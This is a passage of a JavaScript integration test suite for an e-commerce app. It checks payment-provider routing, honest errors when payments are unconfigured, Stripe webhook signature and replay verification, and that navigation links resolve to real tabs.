          customer_name: 'Stripe Hopeful',
          customer_email: 'stripe@nexstore.dev',
          shipping_address: '2 Honest Ave',
          payment_provider: 'stripe',
          items: [{ product_id: prodId, quantity: 1 }]
        }
      });
      assert.equal(res.status, 503);
      assert.ok(/not configured/i.test(res.data.error), 'honest NOT_CONFIGURED message');
      assert.equal(res.data.payment.status, 'NOT_CONFIGURED');

      const after = await apiRequest('/api/payments', { token: adminToken });
      assert.equal(after.data.paymentTransactions.length, beforeCount, 'no transaction fabricated');
    });

    it('unknown providers are rejected; legacy checkouts route to the Test Ledger', async () => {
      const bad = await apiRequest('/api/orders', {
        method: 'POST',
        body: {
          customer_name: 'X',
          customer_email: 'x@x.dev',
          shipping_address: 'Y',
          payment_provider: 'dogecoin',
          items: [{ product_id: prodId, quantity: 1 }]
        }
      });
      assert.equal(bad.status, 400);

      const legacy = await apiRequest('/api/orders', {
        method: 'POST',
        body: {
          customer_name: 'Legacy Buyer',
          customer_email: 'legacy@nexstore.dev',
          shipping_address: '3 Compat St',
          payment_method: 'Card',
          items: [{ product_id: prodId, quantity: 1 }]
        }
      });
      assert.equal(legacy.status, 201);
      assert.equal(legacy.data.paymentTransaction.mode, 'test', 'legacy strings settle on the labeled Test Ledger');
    });

    it('Stripe webhook signatures are really verified (HMAC scheme)', () => {
      const secret = 'whsec_test_secret_123';
      const payload = JSON.stringify({ type: 'payment_intent.succeeded', data: { object: { id: 'pi_1' } } });
      const t = Math.floor(Date.now() / 1000);
      const v1 = createHmac('sha256', secret).update(`${t}.${payload}`).digest('hex');
      assert.equal(verifyStripeSignature(payload, `t=${t},v1=${v1}`, secret), true, 'valid signature accepted');
      assert.equal(verifyStripeSignature(payload, `t=${t},v1=${'0'.repeat(64)}`, secret), false, 'forged signature rejected');
      const stale = t - 3600;
      const staleSig = createHmac('sha256', secret).update(`${stale}.${payload}`).digest('hex');
      assert.equal(verifyStripeSignature(payload, `t=${stale},v1=${staleSig}`, secret), false, 'replay outside tolerance rejected');
    });

    it('webhook endpoint is honest when unconfigured and rejects bad signatures', async () => {
      const res = await apiRequest('/api/payments/webhook/stripe', {
        method: 'POST',
        body: { type: 'payment_intent.succeeded' }
      });
      // Without STRIPE_WEBHOOK_SECRET the endpoint must refuse honestly (503),
      // or, if configured in this env, reject the unsigned payload (400).
      assert.ok([400, 503].includes(res.status), `honest refusal, got ${res.status}`);
    });

    it('manual admin payments also route through the real dispatcher', async () => {
      const res = await apiRequest('/api/payments/process', {
        method: 'POST',
        token: adminToken,
        body: {
          order_id: 'ord-manual-test',
          order_number: 'NEX-MANUAL-1',
          customer_name: 'Manual',
          customer_email: 'manual@nexstore.dev',
          amount: 12.5,
          payment_provider: 'test'
        }
      });
      assert.equal(res.status, 201);
      assert.equal(res.data.paymentTransaction.status, 'TEST_SETTLED');
      assert.equal(res.data.paymentTransaction.mode, 'test');
    });
  });

  // ============================================================================
  // 19. NAVIGATION WIRING INTEGRITY (EVERY LINK TARGET RESOLVES)
  // ============================================================================
  describe('19. Navigation Wiring Integrity', () => {
    const VALID_TABS = new Set([
      'store', 'apps', 'mobile-subs', 'subsystems', 'tracker', 'admin', 'database',
      'docs', 'overview', 'developer-portal', 'user-portal', 'community', 'syscheck',
      'rig-builder' // special-cased overlay, not a tab
    ]);

    it('every setActiveTab/onNavigateTab target in App-wired components is a real destination', () => {
      const wired = [
        'src/components/CommandPaletteModal.jsx',
        'src/components/AdminDashboardView.jsx',
        'src/components/StorefrontView.jsx',
        'src/components/AuthGateView.jsx',
        'src/components/DocumentationView.jsx',
        'src/components/Navbar.jsx',
        'src/components/SysCheckView.jsx',
        'src/components/CommunityView.jsx',
        'src/components/DesktopSideNav.jsx',
        'src/components/MobileBottomNav.jsx'
      ];
      const bad = [];
      for (const rel of wired) {
        const src = fs.readFileSync(path.join(process.cwd(), rel), 'utf8');
        for (const m of src.matchAll(/(?:setActiveTab|onNavigateTab)\??\.\?\(\s*'([a-z-]+)'/g)) {
          if (!VALID_TABS.has(m[1])) bad.push(`${rel} -> '${m[1]}'`);
        }
        for (const m of src.matchAll(/(?:setActiveTab|onNavigateTab)\(\s*'([a-z-]+)'/g)) {
          if (!VALID_TABS.has(m[1])) bad.push(`${rel} -> '${m[1]}'`);
        }
      }
      assert.deepEqual(bad, [], `dead nav targets found: ${bad.join(', ')}`);
    });

    it('command palette tab: fields all resolve to real tabs', () => {
      const src = fs.readFileSync(path.join(process.cwd(), 'src/components/CommandPaletteModal.jsx'), 'utf8');
      const tabs = [...src.matchAll(/tab: '([a-z-]+)'/g)].map((m) => m[1]);
      assert.ok(tabs.length >= 8, 'palette commands carry tab fields');
      for (const t of tabs) assert.ok(VALID_TABS.has(t), `palette tab '${t}' must resolve`);
    });

    it('nav array ids resolve to tabs or declared overlays', () => {
      const overlayIds = new Set(['bto-studio', 'cli-terminal', 'cmd-palette', 'cart-drawer', 'wishlist-drawer', 'compare-modal', 'push-center']);
      const bad = [];
      for (const rel of ['src/components/DesktopSideNav.jsx', 'src/components/MobileBottomNav.jsx']) {
        const src = fs.readFileSync(path.join(process.cwd(), rel), 'utf8');
        const navSection = src.slice(src.indexOf('const primaryNav') >= 0 ? src.indexOf('const primaryNav') : src.indexOf('const allWorkspaces'));
        for (const m of navSection.matchAll(/id: '([a-z-]+)'/g)) {
          const id = m[1];
          if (!VALID_TABS.has(id) && !overlayIds.has(id)) bad.push(`${rel} -> '${id}'`);
        }
      }
      assert.deepEqual(bad, [], `nav entries with unknown destinations: ${bad.join(', ')}`);
    });
  });
});
